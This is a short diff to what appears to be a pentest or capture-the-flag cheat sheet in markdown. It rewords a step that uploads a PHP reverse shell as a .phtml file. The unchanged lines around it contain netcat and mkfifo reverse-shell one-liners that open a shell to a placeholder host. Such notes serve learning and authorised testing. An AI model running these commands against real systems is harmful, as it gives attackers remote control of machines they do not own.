@@ -31,8 +31,7 @@ nc -e /bin/bash <ip> <port>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 ```
 #### File inclusion for reverse shell
-[PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
-Upload php reverse shell as `.phtml`, setup a nc listener, load the phtml location.
+Upload [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) as `.phtml`, setup a nc listener, load the phtml location.
 
 #### Search for SUID bit
 ```
